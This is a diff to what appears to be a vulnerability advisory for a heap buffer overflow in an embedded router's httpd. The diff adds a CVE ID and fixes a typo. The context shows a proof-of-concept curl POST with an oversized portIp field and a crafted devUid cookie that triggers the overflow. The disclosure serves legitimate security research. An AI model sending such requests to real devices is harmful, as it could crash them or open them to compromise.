@@ -18,7 +18,7 @@ The **formSetInternetLanInfo** handler in `/bin/httpd` calls **formSetRemoteInte
 
 *   **Vulnerability Type**: Heap-based Buffer Overflow (CWE-122) and Memory Corruption (CWE-119)
 
-*   **CVE ID**: Requested
+*   **CVE ID**: CVE-2025-15234
 
 *   **Reported by**: Charbel
 
@@ -44,7 +44,7 @@ So we need the following:
 ✅ 4. devUid format: devUid=IP:PORT;  
 ✅ 5. IP must be valid dotted-quad format (xxx.xxx.xxx.xxx)
 
-Now we ca send a POST request to the `/goform/setInternetLanInfo` endpoint to trigger the heap overflow in `formSetRemoteInternetLanInfo`
+Now we can send a POST request to the `/goform/setInternetLanInfo` endpoint to trigger the heap overflow in `formSetRemoteInternetLanInfo`
 
 ```
 curl -X POST http://172.16.182.130/goform/SetInternetLanInfo -H "Cookie: devUid=172.16.182.130:80;" -d "portIp=$(python3 -c 'print("I"*200)')" -d "portMask=/24" -d "portGateWay=192.168.1.1" -d "portDns=8.8.8.8" -d "portSecDns=1"
